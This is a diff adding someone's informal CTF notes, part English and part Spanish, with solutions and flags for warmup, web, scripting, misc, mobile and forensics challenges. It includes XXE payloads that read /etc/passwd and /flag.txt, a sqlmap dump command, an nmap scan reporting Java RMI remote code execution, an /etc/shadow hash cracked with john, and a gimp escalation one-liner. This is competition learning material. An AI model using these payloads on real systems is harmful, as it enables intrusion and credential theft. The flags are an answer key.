@@ -1,0 +1,149 @@
+warmup
+	read the rules
+		flag{we_hope_you_enjoy_the_game}
+	CLIsay
+		flag{Y0u_c4n_r3Ad_M1nd5}
+	metameme
+		flag{N0t_7h3_4cTuaL_Cr3At0r}
+	Mr. Robot (robots.txt)
+		flag{welcome_to_robots.txt}
+	UGGC
+		nqzva (admin rot13)
+		Cookie: user="nqzva"
+		username=nqzva
+		flag{H4cK_aLL_7H3_C0okI3s}
+	Easy keesy
+		archivo q no tengo idea q es
+	Peter rabit
+	
+	Pang
+		archivo sin extension, ponerle png y abrir la imagen
+		flag{wham_bam_thank_you_for_the_flag_maam}
+Web
+	Agent 95
+		cambiar el user agent x User-Agent: Agent 95 (Windows 95 10.0;...
+		flag{user_agents_undercover}
+	Localghost
+		el jquery.jscroll2.js enviarlo a jsnice, y dice flag y un hash (base64)
+		JCTF{spoooooky_ghosts_in_storage}
+	Phphonebook
+		you will only get a flag if it is an emergency
+		agregar al post del phphonebook.php &emergency=true
+		flag{phon3_numb3r_3xtr4ct3d}
+	Official Business
+		http://jh2i.com:50006/robots.txt
+		http://jh2i.com:50006/console
+		http://jh2i.com:50006/console?__debugger__=yes&cmd=resource&f=debugger.js
+		
+		ni idea
+	Seriously
+		plantas y one, two..
+	
+	Extraterrestrial
+		The flag is at the start of the solar system.
+		hice un poco de fuzz y tira error de XML blabla
+		fuzz con XXE	message=%3c%3fxml%20version%3d%221%2e0%22%20encoding%3d%22ISO-8859-1%22%3f%3e%3c!DOCTYPE%20foo%20[%3c!ELEMENT%20foo%20ANY%20%3e%3c!ENTITY%20xxe%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%20%3e]%3e%3cfoo%3e%26xxe%3b%3c%2ffoo%3e
+		devuelve /etc/passwd
+		<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///flag.txt" >]><foo>&xxe;</foo>
+		flag{extraterrestrial_extra_entities}
+	Rejected sequel
+		<!-- if ( isset($_GET["debug"])){ echo($sql_query); } -->
+		python3 ~/tools/sqlmap-dev/sqlmap.py -u "http://jh2i.com:50008/?debug" --level=5 --risk=3 --data="name=a*" -T4 --dump 
+		
+	B'omarr Style
+		
+scripting
+	Rotten
+		// echo "send back this line exactly. no flag here, just filler." | nc jh2i.com 50034 >> salida.txt &  
+		$arre = [];
+		$handle = fopen("salida.txt", "r");
+		$texto = "send back this line exactly. character 2 of the flag is";
+		while (($line = fgets($handle)) !== false) {
+			if (strpos($line, "'") !== false) {
+				$c1 = substr($line, 0, 1);
+				$pos = (int) filter_var($line, FILTER_SANITIZE_NUMBER_INT);
+				$char = substr($line, strpos($line, "'") + 1, 1); //caracter entre 'X'
+				$caracter = substr($line, strpos($line, $char), 1);
+				$c2 = substr($texto, strpos($line, $char), 1);
+				if (strpos($line, $char) !== false && ctype_alpha($char)) {
+					$diferencia = (ord($c2) - ord($caracter));
+					$resul = chr(ord($char) + $diferencia);
+				} else {
+					$resul = $char;
+				}
+				$arre[$pos] = $resul;
+			}
+		}
+
+		ksort($arre);
+		echo var_dump(implode($arre));
+		//flag{no_yf_knf_yfr_caesars}
+		//olaa{n _yo_kno_yor_caesars}
+		//flag{no_yo_kno_yor_caesars}
+		//flag{now_you_know_your_caesars}
+		flag{now_you_know_your_caesars}
+	Big Bird
+	
+	Merriam Webster
+	
+	Really Powerful Gnomes
+		un jueguito x nc, compras armas, juntas oro, repetir. Use un programa para apretar teclado automaticamente 2 enter 2 enter y terminé todo en 5 min
+		flag{it_was_in_fact_you_that_was_really_powerful}
+
+Miscellaneous
+	Vortex
+		nc y salen monton de caracteres, infinito. Lo mando a un file nc jh2i.com 50017 > file2
+		al rato corto y hago cat file2 | grep flag, me tira Binary file (standard input) matches
+		hago cat file2 | grep -a flag > a.txt
+		cat a.txt
+		flag{more_text_in_the_vortex}
+	Alkatraz
+		hay un archivo flag.txt, no se puede cat y muchos otros comandos, ni cd ni nano, etc
+		hice source flag.txt
+		flag{congrats_you_just_escaped_alkatraz}
+	Trapped
+	
+	Roomie
+		dice q hagas nmap del puerto para sacar lo q necesites
+		nmap -Pn -sV -p50028 jh2i.com --script=vuln
+		Starting Nmap 7.70 ( https://nmap.org ) at 2020-06-13 01:43 -03
+		Nmap scan report for jh2i.com (161.35.252.71)
+		Host is up (0.074s latency).
+
+		PORT      STATE SERVICE     VERSION
+		50028/tcp open  rmiregistry Java RMI
+		| rmi-vuln-classloader: 
+		|   VULNERABLE:
+		|   RMI registry default configuration remote code execution vulnerability
+		|     State: VULNERABLE
+		|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.
+		|       
+		|     References:
+		|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb
+		
+	SSH Logger
+		cat /etc/shadow
+		flag:$6$gJKm/fQ2$J92IXYGyoyWUSoIFSR6yFE2bPXLLbOkVEM0n3q.QIcxIiqjQTTyRXMyhIN//XptLmMF5ofxpbyQm6EnZs/A6u.:18425:0:99999:7:::
+		echo "flag:..." > aa.txt 
+		john aa.txt
+	Glimpse
+		ps aux muestra gimp
+		gtfo gimp -idf --batch-interpreter=python-fu-eval -b 'print(open("/root/flag.txt").read())'
+		flag{just_need_a_glimpse_of_the_flag_please}
+		
+Mobile
+	Candroid
+		abri el archivo y busque flag.. -_-
+		flag{4ndr0id_1s_3asy}
+	Simple App
+		abri con jadx y en el main hay un final String flag
+		flag{3asY_4ndr0id_r3vers1ng}
+		
+Forensics
+	Microsooft
+		abrir los zip
+		flag{oof_is_right_why_gfxdata_though}
+	Cow Pie
+		cabecera QFI dice
+		https://filext.com/file-extension/QFI
+
